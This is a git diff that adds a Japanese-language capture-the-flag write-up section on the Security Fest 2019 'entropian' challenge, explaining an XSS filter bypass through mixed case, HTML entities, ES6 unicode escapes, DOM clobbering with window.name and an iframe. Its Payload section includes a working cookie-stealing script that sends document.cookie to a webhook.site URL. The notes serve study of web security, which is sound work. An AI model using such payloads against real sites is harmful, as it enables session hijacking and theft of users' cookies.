@@ -782,10 +782,45 @@ http://e7b7a03e9977.ngrok.io/midnight.php?input=%22script-src%20%27unsafe-inline
 ```
 ![image](https://user-images.githubusercontent.com/56021519/103630620-46ae3a00-4f85-11eb-89ac-be806a414b93.png)  
 
-## 
+## bypass with HTML entity, ES6 unicode / DOM clobbering / iframe (Security Fest 2019 CTF, entropian)
+https://medium.com/@renwa/security-fest-2019-ctf-entropian-web-write-up-f81fb11f675b  
 - **entrypoint**   
-- **概要**   
+この問題の目標はadminのクローラにURLを提出することで、adminのCookieをゲットすることである？？？(たぶん…)  
+  
+`input=<h1>abc</h1>`を入力すると`<h1>abc/`となって同じ文字は二回目以降は削除されるが、XSSが可能である！  
+`<script>`,`<link rel=import href=\/domain>`は同じ文字が出現するので、使えない。  
+そのため、`<svg/onloAd=alret(1)>`で成功する。大文字と小文字を使い分ける。しかしこの大文字と小文字で同じ文字として認識するのはHTMLとしてだけで、Javascriptでは区別するためこの方法は使えない。  
+したがって、`<svg/onloAd=eval(name)>`としてDOM clobberingによって`window.name = "alert(document.domain)"`とすれば、HTMLのwindowオブジェクトのnameの値がJavascriptの変数nameとして使えるため、`eval("alert(document.domain)")`が実行できる！  
+  
+`<svg/onloAd=eval(name)>`の中の`name`のうち`a`,`e`が二回使われているのでバイパスしないといけない。aはHTMLエンティティ`&#97`、eはES6 unicode literals`\u{65}`でバイパスするらしい。  
+  
+`<iframe src=/evil.html>`として`evil.html`の内容を以下のようにすれば、iframeを挿入した元に`<script>`が埋め込まれるので`alert(document.domain)`が実行できる。  
+```html
+<script>
+alert(document.domain);
+</script>
+```
+ただし、これだとadminのセッションではないのでadminのCookieはゲットできない…  
+  
+adminに以下の`evil.html`を実行させて、`window.name`にXSSPayloadをセットした状態で`http://192.168.99.100:8080/midnight.php?input=""><svg onload=eval(name)></svg><!--`にアクセスすれば`eval(alert(document.domain))`をadminのセッションで実行できる？  
+```html
+<script>
+window.name = "alert(document.domain)";
+window.location = "http://192.168.99.100:8080/midnight.php?input=%22%22%3E%3Csvg%20onload=eval(name)%3E%3C/svg%3E%3C!--"
+</script>
+```
+問題設定がよくわからん…  
+
 - **Payload**   
+```txt
+<iframe src=/\PSHTA.ML>
+```
+```html
+<script>
+window.name=”document.location=’https://webhook.site/*hash*?'+document.cookie";
+window.location=”http://entropian-01.pwn.beer:3001/entropian?input=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E"
+</script>
+```
 ## 
 - **entrypoint**   
 - **概要**   
